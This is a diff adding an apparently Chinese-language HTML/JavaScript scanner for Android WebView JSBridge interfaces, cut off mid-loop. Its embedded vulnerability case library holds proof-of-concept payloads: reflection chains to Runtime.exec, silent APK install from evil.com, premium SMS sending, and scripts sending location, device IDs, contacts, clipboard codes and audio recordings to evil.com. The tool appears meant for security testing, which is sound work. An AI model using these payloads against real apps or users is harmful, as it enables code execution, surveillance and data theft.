@@ -1,0 +1,1161 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+<title>JSBridge Scanner v9 - 漏洞案例增强版</title>
+<style>
+:root {
+ --bg: #0f0f23; --card: #1a1a2e; --card-hover: #16213e;
+ --text: #eee; --text-dim: #888;
+ --blue: #00d4ff; --red: #ff4757; --yellow: #ffa502; --green: #2ed573;
+ --purple: #a855f7; --orange: #ff7f50; --critical: #ff0040;
+ --font-size-base: 14px;
+}
+[data-theme="light"] {
+ --bg: #f5f5f5; --card: #ffffff; --card-hover: #e8e8e8;
+ --text: #222; --text-dim: #666;
+}
+@media (max-width: 480px) { :root { --font-size-base: 12px; } }
+@media (min-width: 800px) { :root { --font-size-base: 16px; } }
+* { box-sizing: border-box; }
+body {
+ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+ background: var(--bg); color: var(--text); margin: 0; padding: 0;
+ font-size: var(--font-size-base); line-height: 1.5;
+}
+.container { max-width: 1000px; margin: 0 auto; padding: 12px; }
+
+/* 头部 */
+.header { text-align: center; padding: 12px 0 8px; }
+.header h1 { margin: 0; font-size: 1.4em; color: var(--blue); font-weight: 700; }
+.header .badge { background: linear-gradient(135deg, var(--red), var(--orange)); color: #fff; padding: 2px 8px; border-radius: 4px; font-size: 0.7em; margin-left: 6px; }
+.header p { color: var(--text-dim); font-size: 0.8em; margin-top: 4px; }
+
+/* 案例面板 */
+.case-panel { background: var(--card); border-radius: 10px; padding: 12px; margin-bottom: 12px; border-left: 4px solid var(--red); }
+.case-panel.medium { border-left-color: var(--yellow); }
+.case-title { font-size: 0.95em; font-weight: 600; margin-bottom: 8px; color: var(--orange); }
+.case-list { max-height: 300px; overflow-y: auto; }
+.case-item { background: var(--bg); border-radius: 6px; padding: 10px; margin-bottom: 8px; }
+.case-item:last-child { margin-bottom: 0; }
+.case-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; flex-wrap: wrap; gap: 5px; }
+.case-name { font-weight: 600; color: var(--text); }
+.case-tag { padding: 2px 8px; border-radius: 4px; font-size: 0.7em; font-weight: bold; }
+.case-tag.critical { background: var(--critical); color: #fff; }
+.case-tag.high { background: var(--red); color: #fff; }
+.case-tag.medium { background: var(--yellow); color: #000; }
+.case-desc { color: var(--text-dim); font-size: 0.85em; margin-bottom: 6px; }
+.case-poc { background: #000; border-radius: 4px; padding: 8px; font-family: monospace; font-size: 0.8em; color: var(--green); overflow-x: auto; word-break: break-all; margin-bottom: 6px; }
+.case-ref { font-size: 0.75em; color: var(--blue); }
+
+/* 统计 */
+.stats { display: flex; gap: 6px; margin-bottom: 12px; flex-wrap: wrap; }
+.stat-box { flex: 1; min-width: 55px; background: var(--card); padding: 8px 5px; border-radius: 8px; text-align: center; cursor: pointer; }
+.stat-box:hover { transform: scale(1.02); }
+.stat-box .count { font-size: 1.3em; font-weight: bold; display: block; }
+.stat-box .label { font-size: 0.65em; color: var(--text-dim); }
+.stat-box.critical .count { color: var(--critical); }
+.stat-box.high .count { color: var(--red); }
+.stat-box.medium .count { color: var(--yellow); }
+.stat-box.low .count { color: var(--green); }
+.stat-box.total .count { color: var(--blue); }
+
+/* 搜索 */
+.search-box { margin-bottom: 10px; display: flex; gap: 6px; }
+.search-input { flex: 1; padding: 10px; border: 2px solid var(--card); border-radius: 6px; background: var(--card); color: var(--text); font-size: 0.95em; outline: none; }
+.search-input:focus { border-color: var(--blue); }
+
+/* 工具栏 */
+.toolbar { display: flex; gap: 5px; margin-bottom: 10px; flex-wrap: wrap; }
+.tool-btn { padding: 8px 12px; border: none; border-radius: 5px; background: var(--card); color: var(--text); font-size: 0.8em; cursor: pointer; }
+.tool-btn:hover { background: var(--card-hover); }
+.tool-btn.primary { background: var(--blue); color: #000; }
+
+/* 接口列表 */
+.results { margin-bottom: 15px; }
+.item { background: var(--card); border-radius: 8px; margin-bottom: 6px; overflow: hidden; border-left: 3px solid transparent; }
+.item.critical { border-left-color: var(--critical); }
+.item.high { border-left-color: var(--red); }
+.item.medium { border-left-color: var(--yellow); }
+.item.low { border-left-color: var(--green); }
+.item:hover { background: var(--card-hover); }
+
+.item-header { padding: 10px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
+.item-name { font-weight: 600; font-size: 0.92em; }
+.item-type { color: var(--text-dim); font-size: 0.65em; background: var(--bg); padding: 1px 4px; border-radius: 3px; margin-left: 4px; }
+.item-category { color: var(--blue); font-size: 0.65em; margin-left: 6px; }
+.item-right { display: flex; align-items: center; gap: 5px; }
+.risk-tag { padding: 2px 6px; border-radius: 10px; font-size: 0.6em; font-weight: bold; }
+.risk-tag.critical { background: var(--critical); color: #fff; }
+.risk-tag.high { background: var(--red); color: #fff; }
+.risk-tag.medium { background: var(--yellow); color: #000; }
+.risk-tag.low { background: var(--green); color: #000; }
+.arrow { font-size: 0.65em; color: var(--text-dim); transition: transform 0.2s; }
+.item.expanded .arrow { transform: rotate(180deg); }
+
+.item-body { display: none; padding: 0 10px 10px; border-top: 1px solid var(--card-hover); }
+.item.expanded .item-body { display: block; }
+
+.item-info { padding: 8px; background: rgba(255,71,87,0.1); border-radius: 6px; margin-bottom: 8px; font-size: 0.78em; }
+.item-info-title { color: var(--red); font-weight: 600; margin-bottom: 3px; }
+.item-info-desc { color: var(--text-dim); }
+
+.method-list { max-height: 250px; overflow-y: auto; }
+.method-item { padding: 5px 6px; background: var(--bg); border-radius: 4px; margin-bottom: 3px; display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
+.method-type { font-size: 0.6em; padding: 1px 4px; border-radius: 3px; background: var(--purple); color: #fff; }
+.method-type.function { background: var(--blue); color: #000; }
+.method-name { font-family: monospace; font-size: 0.78em; }
+.method-btn { padding: 2px 6px; border: none; border-radius: 3px; font-size: 0.65em; cursor: pointer; background: var(--card-hover); color: var(--text); }
+
+/* 调用面板 */
+.call-panel { margin-top: 8px; background: var(--bg); border-radius: 6px; padding: 8px; }
+.call-title { font-size: 0.8em; font-weight: 600; margin-bottom: 6px; color: var(--blue); }
+.call-row { display: flex; gap: 5px; margin-bottom: 6px; }
+.call-input { flex: 1; padding: 6px; border: 1px solid var(--card); border-radius: 4px; background: var(--card); color: var(--text); font-size: 0.78em; font-family: monospace; }
+.call-btn { padding: 6px 10px; border: none; border-radius: 4px; background: var(--blue); color: #000; font-weight: 600; cursor: pointer; font-size: 0.75em; }
+.call-result { margin-top: 6px; padding: 6px; border-radius: 4px; font-size: 0.7em; font-family: monospace; white-space: pre-wrap; word-break: break-all; max-height: 120px; overflow: auto; display: none; }
+.call-result.success { background: rgba(46,213,115,0.1); border-left: 2px solid var(--green); }
+.call-result.error { background: rgba(255,71,87,0.1); border-left: 2px solid var(--red); }
+.call-result.info { background: rgba(0,212,255,0.1); border-left: 2px solid var(--blue); }
+
+/* Modal */
+.modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; padding: 15px; }
+.modal.show { display: flex; }
+.modal-content { background: var(--card); border-radius: 10px; padding: 15px; max-width: 750px; width: 100%; max-height: 85vh; overflow: auto; }
+.modal-title { font-size: 1.05em; font-weight: 600; margin-bottom: 10px; }
+.modal-body { font-size: 0.72em; font-family: monospace; background: var(--bg); padding: 10px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; max-height: 58vh; overflow: auto; }
+.modal-btn { width: 100%; padding: 10px; border: none; border-radius: 6px; font-size: 0.85em; font-weight: 600; cursor: pointer; margin-top: 6px; }
+.modal-btn.primary { background: var(--blue); color: #000; }
+.modal-btn.secondary { background: var(--card-hover); color: var(--text); }
+
+.toast { position: fixed; bottom: 15px; left: 50%; transform: translateX(-50%); background: var(--card); color: var(--text); padding: 8px 16px; border-radius: 14px; font-size: 0.85em; z-index: 2000; opacity: 0; transition: opacity 0.3s; max-width: 90%; text-align: center; }
+.toast.show { opacity: 1; }
+.empty { text-align: center; color: var(--text-dim); padding: 20px; font-size: 0.9em; }
+
+.theme-toggle { position: absolute; top: 15px; right: 15px; background: var(--card); border: none; padding: 8px 12px; border-radius: 6px; cursor: pointer; color: var(--text); font-size: 0.85em; }
+</style>
+</head>
+<body>
+<button class="theme-toggle" onclick="toggleTheme()">🌓 切换主题</button>
+<div class="container">
+<div class="header">
+ <h1>JSBridge Scanner v9<span class="badge">漏洞案例增强版</span></h1>
+ <p>真实漏洞案例 | PoC利用方法 | CVE参考 | 风险评分</p>
+</div>
+
+<!-- 高危案例面板 -->
+<div class="case-panel" id="case-panel">
+ <div class="case-title">🚨 真实漏洞案例库（点击展开查看利用方法）</div>
+ <div class="case-list" id="case-list">加载中...</div>
+</div>
+
+<div class="stats" id="stats"></div>
+
+<div class="search-box">
+ <input type="text" class="search-input" id="search" placeholder="搜索接口、方法、CVE编号..." oninput="applySearch()">
+</div>
+
+<div class="toolbar">
+ <button class="tool-btn" onclick="expandAll()">展开全部</button>
+ <button class="tool-btn" onclick="collapseAll()">折叠全部</button>
+ <button class="tool-btn" onclick="exportJSON()">导出JSON</button>
+ <button class="tool-btn" onclick="exportReport()">导出报告</button>
+ <button class="tool-btn primary" onclick="location.reload()">重新扫描</button>
+</div>
+
+<div class="results" id="results"></div>
+</div>
+
+<div class="modal" id="modal">
+<div class="modal-content">
+ <div class="modal-title" id="modal-title"></div>
+ <div class="modal-body" id="modal-body"></div>
+ <button class="modal-btn primary" onclick="copyModal()">复制</button>
+ <button class="modal-btn secondary" onclick="closeModal()">关闭</button>
+</div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+(function() {
+// ===================== 真实漏洞案例库 =====================
+const VULN_CASES = [
+ {
+  id: "CVE-2012-6636",
+  name: "addJavascriptInterface RCE",
+  severity: "critical",
+  cvss: 10.0,
+  desc: "Android 4.2之前，addJavascriptInterface注入的对象可通过反射获取Runtime执行任意命令",
+  affected: "Android < 4.2 (API Level < 17)",
+  interfaces: ["JSInterface", "AppInterface", "AndroidInterface", "jsInterface"],
+  poc: `// 利用反射执行命令
+window.JSInterface.getClass().forName('java.lang.Runtime')
+ .getMethod('getRuntime', null).invoke(null, null)
+ .exec(['id']);`,
+  steps: [
+   "检测是否存在注入的JS接口对象",
+   "尝试调用 .getClass().forName() 反射",
+   "获取Runtime.getRuntime().exec()",
+   "执行任意系统命令"
+  ],
+  ref: "CVE-2012-6636, CVE-2013-4710"
+ },
+ {
+  id: "CVE-2014-1939",
+  name: "searchBoxJavaBridge_ RCE",
+  severity: "critical",
+  cvss: 9.8,
+  desc: "Android 3.0-4.3系统WebView默认注入searchBoxJavaBridge_，可被利用执行任意代码",
+  affected: "Android 3.0 - 4.3.1",
+  interfaces: ["searchBoxJavaBridge_", "accessibilityTraversal", "accessibility", "AccessibilityNodeInfo"],
+  poc: `// 利用searchBoxJavaBridge_执行命令
+window.searchBoxJavaBridge_.getClass()
+ .forName('java.lang.Runtime')
+ .getMethod('getRuntime', null).invoke(null, null)
+ .exec(['cat', '/data/data/包名/shared_prefs/config.xml']);`,
+  steps: [
+   "检查window是否存在searchBoxJavaBridge_",
+   "通过反射链获取Runtime对象",
+   "执行命令读取应用私有数据",
+   "可通过removeJavascriptInterface('searchBoxJavaBridge_')修复"
+  ],
+  ref: "CVE-2014-1939"
+ },
+ {
+  id: "CVE-2014-7224",
+  name: "accessibilityTraversal RCE",
+  severity: "critical",
+  cvss: 9.8,
+  desc: "Android 4.4之前WebView存在accessibilityTraversal接口，可被利用执行任意代码",
+  affected: "Android < 4.4",
+  interfaces: ["accessibilityTraversal", "accessibility"],
+  poc: `// 利用accessibility接口
+window.accessibilityTraversal.getClass()
+ .forName('java.lang.Runtime')
+ .getDeclaredMethod('getRuntime').invoke(null)
+ .exec('id');`,
+  steps: [
+   "检测accessibilityTraversal接口",
+   "利用反射执行系统命令",
+   "需要移除该接口或升级系统"
+  ],
+  ref: "CVE-2014-7224"
+ },
+ {
+  id: "PAYMENT-001",
+  name: "未授权支付风险",
+  severity: "critical",
+  cvss: 9.1,
+  desc: "部分App的支付接口未做二次验证，JS可直接调用支付",
+  affected: "电商/金融类App",
+  interfaces: ["pay", "doPay", "startPay", "alipay", "wxpay", "tradePay", "payment", "wallet"],
+  poc: `// 尝试发起支付
+window.alipay.pay({
+ order: "test_order_001",
+ amount: "0.01",
+ notifyUrl: "http://evil.com/callback"
+});`,
+  steps: [
+   "查找支付相关接口",
+   "构造支付参数尝试调用",
+   "观察是否需要密码/指纹确认",
+   "若可直接支付则为严重漏洞"
+  ],
+  ref: "移动支付安全测试案例"
+ },
+ {
+  id: "SMS-001",
+  name: "短信劫持风险",
+  severity: "critical",
+  cvss: 8.6,
+  desc: "JSBridge可发送短信，可能被用于发送扣费短信或劫持验证码",
+  affected: "各类App",
+  interfaces: ["sendSms", "sms", "sendMessage", "smsManager", "sendText"],
+  poc: `// 发送扣费短信
+window.smsManager.sendSms({
+ number: "106XXXXXXX",
+ content: "确认订阅 XX服务"
+});`,
+  steps: [
+   "查找短信相关接口",
+   "构造短信内容测试",
+   "观察是否有用户确认",
+   "检查号码是否有限制"
+  ],
+  ref: "短信扣费攻击案例"
+ },
+ {
+  id: "APK-001",
+  name: "静默安装APK",
+  severity: "critical",
+  cvss: 9.0,
+  desc: "JSBridge可静默安装APK，攻击者可诱导安装恶意应用",
+  affected: "应用商店/下载类App",
+  interfaces: ["installApk", "installApp", "downloadApk", "install", "silentInstall"],
+  poc: `// 静默安装恶意APK
+window.installApk({
+ url: "http://evil.com/malware.apk",
+ autoInstall: true,
+ packageName: "com.evil.malware"
+});`,
+  steps: [
+   "查找安装相关接口",
+   "构造恶意APK下载链接",
+   "测试是否可静默安装",
+   "检查是否有来源验证"
+  ],
+  ref: "Android恶意软件传播案例"
+ },
+ {
+  id: "FILE-001",
+  name: "任意文件读取",
+  severity: "high",
+  cvss: 7.5,
+  desc: "JSBridge可读取应用私有目录文件，泄露敏感数据",
+  affected: "文件管理/阅读类App",
+  interfaces: ["readFile", "getFile", "openFile", "loadFile", "getFileContent"],
+  poc: `// 读取应用私有数据
+window.readFile({
+ path: "/data/data/com.target.app/shared_prefs/config.xml",
+ encoding: "utf-8"
+});`,
+  steps: [
+   "查找文件读取接口",
+   "尝试读取应用私有目录",
+   "检查路径是否有限制",
+   "可读取敏感配置和token"
+  ],
+  ref: "本地文件泄露案例"
+ },
+ {
+  id: "FILE-002",
+  name: "任意文件写入",
+  severity: "high",
+  cvss: 7.8,
+  desc: "JSBridge可写入文件，可能被用于植入后门或修改配置",
+  affected: "文件管理类App",
+  interfaces: ["writeFile", "saveFile", "createFile", "downloadFile"],
+  poc: `// 写入恶意脚本
+window.writeFile({
+ path: "/data/data/com.target.app/files/evil.js",
+ content: "eval(atob('YWxlcnQoMSk='))"
+});`,
+  steps: [
+   "查找文件写入接口",
+   "尝试写入到应用目录",
+   "可修改配置植入后门",
+   "检查写入路径限制"
+  ],
+  ref: "配置篡改案例"
+ },
+ {
+  id: "INTENT-001",
+  name: "Intent注入攻击",
+  severity: "high",
+  cvss: 7.5,
+  desc: "JSBridge可构造Intent跳转，可能启动其他App的Activity",
+  affected: "浏览器/导航类App",
+  interfaces: ["startActivity", "openActivity", "intent", "launchIntent"],
+  poc: `// 启动其他App的Activity
+window.startActivity({
+ action: "android.intent.action.VIEW",
+ data: "intent://app/#Intent;scheme=app;package=com.victim.app;end"
+});`,
+  steps: [
+   "查找Intent相关接口",
+   "构造Intent Scheme",
+   "尝试启动其他App组件",
+   "可能绕过权限检查"
+  ],
+  ref: "Intent重定向攻击案例"
+ },
+ {
+  id: "URL-001",
+  name: "URL劫持/XSS",
+  severity: "high",
+  cvss: 7.2,
+  desc: "JSBridge可打开任意URL，可能被用于钓鱼或XSS攻击",
+  affected: "浏览器/内容展示类App",
+  interfaces: ["openUrl", "loadUrl", "openLink", "openWeb", "navigate"],
+  poc: `// 打开钓鱼页面
+window.openUrl({
+ url: "http://evil.com/phishing.html",
+ headers: {
+  "X-Custom": "bypass_sameorigin"
+ }
+});`,
+  steps: [
+   "查找URL打开接口",
+   "测试是否能打开任意URL",
+   "尝试Intent Scheme",
+   "检查URL白名单"
+  ],
+  ref: "WebView URL劫持案例"
+ },
+ {
+  id: "LOC-001",
+  name: "位置信息泄露",
+  severity: "medium",
+  cvss: 5.9,
+  desc: "JSBridge可获取GPS位置，可能被用于追踪用户",
+  affected: "地图/社交/生活服务类App",
+  interfaces: ["getLocation", "location", "gps", "getPosition", "geoLocation"],
+  poc: `// 获取用户位置
+window.getLocation({
+ enableHighAccuracy: true,
+ timeout: 5000
+}, function(result) {
+ // 发送到攻击者服务器
+ fetch('http://evil.com/collect?lat=' + result.lat + '&lng=' + result.lng);
+});`,
+  steps: [
+   "查找定位接口",
+   "调用获取位置信息",
+   "检查是否有权限提示",
+   "评估数据泄露风险"
+  ],
+  ref: "位置隐私泄露案例"
+ },
+ {
+  id: "DEVICE-001",
+  name: "设备标识泄露",
+  severity: "medium",
+  cvss: 5.3,
+  desc: "JSBridge可获取IMEI/IMSI等设备标识，用于追踪用户",
+  affected: "各类App",
+  interfaces: ["getDeviceId", "imei", "imsi", "getDevice", "androidId", "mac", "uuid"],
+  poc: `// 获取设备标识
+var device = {
+ imei: window.getDeviceId(),
+ imsi: window.getIMSI(),
+ mac: window.getMacAddress(),
+ androidId: window.getAndroidId()
+};
+// 发送至攻击服务器
+navigator.sendBeacon('http://evil.com/collect', JSON.stringify(device));`,
+  steps: [
+   "查找设备信息接口",
+   "获取各类设备标识",
+   "检查是否需要授权",
+   "评估隐私风险"
+  ],
+  ref: "设备指纹追踪案例"
+ },
+ {
+  id: "CONTACT-001",
+  name: "通讯录泄露",
+  severity: "high",
+  cvss: 7.5,
+  desc: "JSBridge可获取通讯录，泄露用户社交关系",
+  affected: "社交/通讯类App",
+  interfaces: ["getContacts", "contacts", "addressBook", "showAddressBook"],
+  poc: `// 获取通讯录
+window.getContacts(function(contacts) {
+ // 上传所有联系人
+ contacts.forEach(function(c) {
+  fetch('http://evil.com/collect?name=' + c.name + '&phone=' + c.phone);
+ });
+});`,
+  steps: [
+   "查找通讯录接口",
+   "调用获取联系人列表",
+   "检查是否有授权提示",
+   "评估数据泄露范围"
+  ],
+  ref: "通讯录泄露案例"
+ },
+ {
+  id: "CLIPBOARD-001",
+  name: "剪贴板窃取",
+  severity: "medium",
+  cvss: 4.5,
+  desc: "JSBridge可读取剪贴板，可能获取验证码等敏感信息",
+  affected: "输入法/工具类App",
+  interfaces: ["getClipboard", "clipboard", "paste", "readClipboard"],
+  poc: `// 监听剪贴板变化
+setInterval(function() {
+ window.getClipboard(function(text) {
+  // 检测验证码格式并发送
+  if (/\\d{4,6}/.test(text)) {
+   fetch('http://evil.com/verify?code=' + text);
+  }
+ });
+}, 1000);`,
+  steps: [
+   "查找剪贴板接口",
+   "定时读取剪贴板内容",
+   "匹配验证码格式",
+   "检查是否有使用提示"
+  ],
+  ref: "剪贴板劫持案例"
+ },
+ {
+  id: "AUDIO-001",
+  name: "静默录音风险",
+  severity: "medium",
+  cvss: 5.0,
+  desc: "JSBridge可能被利用进行静默录音",
+  affected: "语音/社交类App",
+  interfaces: ["startRecord", "audio", "record", "microphone", "voice"],
+  poc: `// 静默录音
+window.audio.startRecord({
+ duration: 60000, // 录制60秒
+ callback: function(audioData) {
+  // 上传录音
+  fetch('http://evil.com/upload', {method: 'POST', body: audioData});
+ }
+});`,
+  steps: [
+   "查找音频录制接口",
+   "测试是否能静默启动",
+   "检查是否有UI提示",
+   "评估窃听风险"
+  ],
+  ref: "隐私窃听案例"
+ },
+ {
+  id: "TOKEN-001",
+  name: "Token泄露风险",
+  severity: "medium",
+  cvss: 5.5,
+  desc: "JSBridge可能返回认证Token，可被用于接管账户",
+  affected: "各类App",
+  interfaces: ["getToken", "token", "accessToken", "sessionKey", "authToken", "userInfo"],
+  poc: `// 获取认证Token
+var token = window.getToken();
+// 使用Token接管账户
+fetch('https://api.victim.com/user/profile', {
+ headers: {'Authorization': 'Bearer ' + token}
+});`,
+  steps: [
+   "查找Token相关接口",
+   "获取认证凭证",
+   "测试Token有效性",
+   "评估账户接管风险"
+  ],
+  ref: "认证凭证泄露案例"
+ }
+];
+
+// ===================== 接口功能知识库（含案例引用）======================
+const INTERFACE_KNOWLEDGE = {
+ // 高风险
+ exec: {
+  category: "代码执行",
+  desc: "可能执行任意代码，参考CVE-2012-6636",
+  riskLevel: "critical",
+  cvss: 10.0,
+  caseId: "CVE-2012-6636",
+  keywords: ["exec", "eval", "shell", "cmd", "execute", "runcommand", "searchBoxJavaBridge_", "accessibilityTraversal", "invoke", "runtime", "getClass"]
+ },
+ payment: {
+  category: "支付",
+  desc: "未授权支付风险，参考PAYMENT-001",
+  riskLevel: "critical",
+  cvss: 9.1,
+  caseId: "PAYMENT-001",
+  keywords: ["pay", "payment", "alipay", "wxpay", "tradepay", "dopay", "startpay", "wallet", "checkout"]
+ },
+ sms: {
+  category: "短信",
+  desc: "短信劫持风险，参考SMS-001",
+  riskLevel: "critical",
+  cvss: 8.6,
+  caseId: "SMS-001",
+  keywords: ["sendsms", "sms", "sendsmessage", "smsmanager", "sendtext", "message"]
+ },
+ app: {
+  category: "应用管理",
+  desc: "静默安装APK风险，参考APK-001",
+  riskLevel: "critical",
+  cvss: 9.0,
+  caseId: "APK-001",
+  keywords: ["install", "installapp", "installapk", "uninstall", "launchapp", "openapp", "downloadapk", "silentInstall"]
+ },
+ contact: {
+  category: "通讯录",
+  desc: "通讯录泄露风险，参考CONTACT-001",
+  riskLevel: "high",
+  cvss: 7.5,
+  caseId: "CONTACT-001",
+  keywords: ["contact", "addressbook", "getcontacts", "contacts", "showaddressbook", "getAddressBook"]
+ },
+ fileRead: {
+  category: "文件读取",
+  desc: "任意文件读取风险，参考FILE-001",
+  riskLevel: "high",
+  cvss: 7.5,
+  caseId: "FILE-001",
+  keywords: ["readfile", "getfile", "openfile", "loadfile", "getfilecontent", "readFileContent"]
+ },
+ fileWrite: {
+  category: "文件写入",
+  desc: "任意文件写入风险，参考FILE-002",
+  riskLevel: "high",
+  cvss: 7.8,
+  caseId: "FILE-002",
+  keywords: ["writefile", "savefile", "createfile", "downloadfile", "save", "write"]
+ },
+ intent: {
+  category: "Intent注入",
+  desc: "Intent注入风险，参考INTENT-001",
+  riskLevel: "high",
+  cvss: 7.5,
+  caseId: "INTENT-001",
+  keywords: ["startactivity", "openactivity", "intent", "launchintent", "scheme", "deeplink"]
+ },
+ url: {
+  category: "URL劫持",
+  desc: "URL劫持/XSS风险，参考URL-001",
+  riskLevel: "high",
+  cvss: 7.2,
+  caseId: "URL-001",
+  keywords: ["openurl", "loadurl", "openlink", "openweb", "startactivity", "openpage", "navigate", "href"]
+ },
+ // 中风险
+ location: {
+  category: "定位",
+  desc: "位置信息泄露风险，参考LOC-001",
+  riskLevel: "medium",
+  cvss: 5.9,
+  caseId: "LOC-001",
+  keywords: ["location", "getlocation", "geolocation", "gps", "position", "getposition", "coordinates"]
+ },
+ device: {
+  category: "设备信息",
+  desc: "设备标识泄露风险，参考DEVICE-001",
+  riskLevel: "medium",
+  cvss: 5.3,
+  caseId: "DEVICE-001",
+  keywords: ["device", "deviceid", "imei", "imsi", "mac", "androidid", "uuid", "getdevice", "serial", "getDeviceId"]
+ },
+ userinfo: {
+  category: "用户信息",
+  desc: "用户信息泄露风险",
+  riskLevel: "medium",
+  cvss: 5.5,
+  caseId: "TOKEN-001",
+  keywords: ["userinfo", "getuser", "userprofile", "getprofile", "account", "loginuser", "getUserInfo"]
+ },
+ clipboard: {
+  category: "剪贴板",
+  desc: "剪贴板窃取风险，参考CLIPBOARD-001",
+  riskLevel: "medium",
+  cvss: 4.5,
+  caseId: "CLIPBOARD-001",
+  keywords: ["clipboard", "copy", "paste", "setclipboard", "getclipboard", "readClipboard"]
+ },
+ audio: {
+  category: "音频",
+  desc: "静默录音风险，参考AUDIO-001",
+  riskLevel: "medium",
+  cvss: 5.0,
+  caseId: "AUDIO-001",
+  keywords: ["audio", "record", "voice", "microphone", "startrecord", "stoprecord", "media"]
+ },
+ network: {
+  category: "网络请求",
+  desc: "可能发起网络请求泄露数据",
+  riskLevel: "medium",
+  cvss: 4.8,
+  caseId: null,
+  keywords: ["request", "fetch", "ajax", "http", "upload", "httprequest", "send"]
+ },
+ token: {
+  category: "认证凭证",
+  desc: "Token泄露风险，参考TOKEN-001",
+  riskLevel: "medium",
+  cvss: 5.5,
+  caseId: "TOKEN-001",
+  keywords: ["token", "gettoken", "accesstoken", "sessionkey", "authtoken", "jwt", "sessionId"]
+ },
+ // 低风险
+ camera: {
+  category: "相机/图片",
+  desc: "调用摄像头，一般有UI提示",
+  riskLevel: "low",
+  cvss: 2.5,
+  caseId: null,
+  keywords: ["camera", "photo", "takephoto", "chooseimage", "selectimage", "openCamera", "openCameraOrPhoto"]
+ },
+ album: {
+  category: "相册",
+  desc: "访问相册，一般有UI提示",
+  riskLevel: "low",
+  cvss: 2.0,
+  caseId: null,
+  keywords: ["album", "gallery", "picture", "saveimage", "previewimage", "photoLibrary"]
+ },
+ notification: {
+  category: "通知",
+  desc: "发送通知，一般无明显风险",
+  riskLevel: "low",
+  cvss: 1.5,
+  caseId: null,
+  keywords: ["notification", "toast", "alert", "showtoast", "push", "showMessage"]
+ },
+ share: {
+  category: "分享",
+  desc: "分享内容，一般无明显风险",
+  riskLevel: "low",
+  cvss: 1.0,
+  caseId: null,
+  keywords: ["share", "shareto", "sharelink", "socialshare", "shareTo"]
+ },
+ scan: {
+  category: "扫码",
+  desc: "调用扫码，一般无明显风险",
+  riskLevel: "low",
+  cvss: 1.5,
+  caseId: null,
+  keywords: ["scan", "qrcode", "barcode", "scancode", "qr", "scanQRCode"]
+ },
+ storage: {
+  category: "存储",
+  desc: "本地存储操作",
+  riskLevel: "low",
+  cvss: 2.0,
+  caseId: null,
+  keywords: ["storage", "localstorage", "setdata", "getdata", "savedata", "preference", "cache", "store"]
+ },
+ permission: {
+  category: "权限",
+  desc: "请求系统权限",
+  riskLevel: "low",
+  cvss: 1.0,
+  caseId: null,
+  keywords: ["permission", "requestpermission", "checkpermission", "requestauth", "grant"]
+ },
+ biometric: {
+  category: "生物识别",
+  desc: "指纹/面容识别",
+  riskLevel: "low",
+  cvss: 0.5,
+  caseId: null,
+  keywords: ["fingerprint", "faceid", "touchid", "biometric", "auth"]
+ },
+ navigationUI: {
+  category: "导航/UI",
+  desc: "页面导航",
+  riskLevel: "low",
+  cvss: 0.5,
+  caseId: null,
+  keywords: ["navigation", "shownavigation", "jumppagepath", "navigationbar", "titlebar", "toolbar", "back"]
+ },
+ bridge: {
+  category: "JSBridge",
+  desc: "通用桥接接口",
+  riskLevel: "pending",
+  cvss: 3.0,
+  caseId: null,
+  keywords: ["bridge", "jsbridge", "hybrid", "native", "callback", "postmessage", "callHandler"]
+ }
+};
+
+// ===================== 基线检测 =====================
+function getInjectedProps() {
+ try {
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+  const cleanWindow = iframe.contentWindow;
+  const current = Object.getOwnPropertyNames(window);
+  const clean = Object.getOwnPropertyNames(cleanWindow);
+  document.body.removeChild(iframe);
+  return current.filter(p => !clean.includes(p));
+ } catch(e) {
+  const baseline = ["postMessage","blur","focus","close","parent","opener","top","length","frames","closed","location","self","window","document","name","customElements","history","locationbar","menubar","personalbar","scrollbars","statusbar","toolbar","status","frameElement","navigator","origin","external","screen","innerWidth","innerHeight","scrollX","pageXOffset","scrollY","pageYOffset","visualViewport","screenX","screenY","outerWidth","outerHeight","devicePixelRatio","clientInformation","screenLeft","screenTop","defaultStatus","defaultstatus","styleMedia","isSecureContext","performance","stop","open","alert","confirm","prompt","print","queueMicrotask","requestAnimationFrame","cancelAnimationFrame","captureEvents","releaseEvents","requestIdleCallback","cancelIdleCallback","getComputedStyle","matchMedia","moveTo","moveBy","resizeTo","resizeBy","scroll","scrollTo","scrollBy","getSelection","find","webkitRequestAnimationFrame","webkitCancelAnimationFrame","fetch","btoa","atob","setTimeout","clearTimeout","setInterval","clearInterval","createImageBitmap","onappinstalled","onbeforeinstallprompt","crypto","ondevicemotion","ondeviceorientation","ondeviceorientationabsolute","indexedDB","webkitStorageInfo","sessionStorage","localStorage","orientation","onorientationchange","openDatabase","ontouchcancel","ontouchend","ontouchmove","ontouchstart","TEMPORARY","PERSISTENT","addEventListener","removeEventListener","dispatchEvent"];
+  const result = [];
+  for (const key in window) {
+   if (!baseline.includes(key) && !key.startsWith("on") && !key.startsWith("webkit")) {
+    result.push(key);
+   }
+  }
+  return result;
+ }
+}
+
+// ===================== JSBridge识别 =====================
+function isLikelyBridge(obj) {
+ if (!obj) return false;
+ try {
+  const type = typeof obj;
+  if (type === "function") return true;
+  if (type !== "object") return false;
+  const keys = Object.keys(obj);
+  if (keys.length === 0 || keys.length > 100) return false;
+  return keys.some(k => typeof obj[k] === "function");
+ } catch(e) {
+  return false;
+ }
+}
+
+// ===================== 接口识别 =====================
+function identifyInterface(name) {
+ const str = name.toLowerCase();
+ for (const [key, info] of Object.entries(INTERFACE_KNOWLEDGE)) {
+  for (const kw of info.keywords) {
+   if (str.includes(kw.toLowerCase())) {
+    return { category: info.category, ...info, matchedKeyword: kw };
+   }
+  }
+ }
+ return null;
+}
+
+// ===================== 获取案例 =====================
+function getCaseById(caseId) {
+ if (!caseId) return null;
+ return VULN_CASES.find(c => c.id === caseId) || null;
+}
+
+// ===================== 扫描执行 =====================
+const injectedProps = getInjectedProps();
+const scanResults = [];
+const detectedCases = new Set();
+
+for (const key of injectedProps) {
